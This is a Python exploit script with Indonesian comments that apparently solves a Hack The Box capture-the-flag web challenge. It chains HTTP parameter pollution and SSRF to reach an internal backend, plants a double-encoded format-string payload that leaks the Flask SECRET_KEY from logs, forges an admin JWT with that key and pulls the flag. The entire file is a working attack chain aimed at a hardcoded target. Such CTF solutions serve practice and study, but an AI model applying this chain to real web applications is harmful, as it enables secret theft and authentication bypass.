import requests
import jwt
import re
import time
import sys
from urllib.parse import quote, urlparse

# === KONFIGURASI ===
TARGET_URL = "http://94.237.63.174:47417" 
parsed = urlparse(TARGET_URL)
PUBLIC_HOST = parsed.netloc # Mengambil IP:Port publik

INTERNAL_BACKEND = "http://127.0.0.1:5000"
# Gunakan file gambar yang ada di server sebagai umpan balik (pasti 200 OK)
SAFE_UMPAN = f"http://{PUBLIC_HOST}/images/bar.png"

session = requests.Session()

def get_clean_text(content):
    """Membersihkan PDF biner agar teksnya nyambung"""
    return content.decode('latin-1', errors='ignore').replace('\n', '').replace(' ', '')

def solve():
    print(f"\n--- OFFLINEA FINAL BYPASS (HPP + SELF-REFLECTION) ---")
    print(f"[*] Target Public IP: {PUBLIC_HOST}")

    # 1. INJEKSI PAYLOAD
    # { -> %257b | } -> %257d (Double Encoding)
    payload = "%257blogify.__globals__[app].config[SECRET_KEY]%257d"
    inject_target = f"{INTERNAL_BACKEND}/generate?name=hacker&secret=hacker&url=http://8.8.8.8/?leak={payload}"
    
    print("[*] Tahap 1: Injeksi payload format string...")
    params = f"url={quote(inject_target)}&name=hacker&secret=hacker&url={SAFE_UMPAN}"
    session.get(f"{TARGET_URL}/bartender.php?{params}")
    time.sleep(12) # Kasih waktu lebih lama buat Selenium

    # 2. LEAK SECRET_KEY
    print("[*] Tahap 2: Memicu SSRF via HPP untuk mencuri SECRET_KEY...")
    leak_url = f"{INTERNAL_BACKEND}/logs"
    leak_params = f"url={quote(leak_url)}&name=hacker&secret=hacker&url={SAFE_UMPAN}"
    
    response = session.get(f"{TARGET_URL}/bartender.php?{leak_params}")
    
    # Ambil teks mentah dan cari hex 64 karakter
    clean_text = get_clean_text(response.content)
    key_match = re.search(r'[a-f0-9]{64}', clean_text)
    
    if not key_match:
        print("[-] Gagal mengekstrak SECRET_KEY otomatis.")
        print("[!] Tips: Reset instance di HTB, lalu jalankan lagi skrip ini.")
        return

    secret_key = key_match.group(0)
    print(f"[+] Berhasil mencuri SECRET_KEY: {secret_key}")

    # 3. BUAT JWT ADMIN
    token = jwt.encode({"username": "bartender", "is_admin": True}, secret_key, algorithm="HS256")
    print(f"[+] JWT Token: {token}")

    # 4. AMBIL FLAG
    print("[*] Tahap 4: Mengambil Flag via SSRF...")
    flag_url = f"{INTERNAL_BACKEND}/bartender?token={token}"
    flag_params = f"url={quote(flag_url)}&name=a&secret=a&url={SAFE_UMPAN}"
    
    final_res = session.get(f"{TARGET_URL}/bartender.php?{flag_params}")
    time.sleep(12)
    
    # Cari flag HTB{...}
    final_text = get_clean_text(final_res.content)
    flag_match = re.search(r'HTB\{.*?\}', final_text)
    
    if flag_match:
        print(f"\n" + "="*50)
        print(f" FLAG: {flag_match.group(0)} ")
        print("="*50)
    else:
        print("\n[-] Flag tidak ditemukan di teks PDF. Coba buka manual file PDF terbaru di folder /pdfs/.")

if __name__ == "__main__":
    solve()
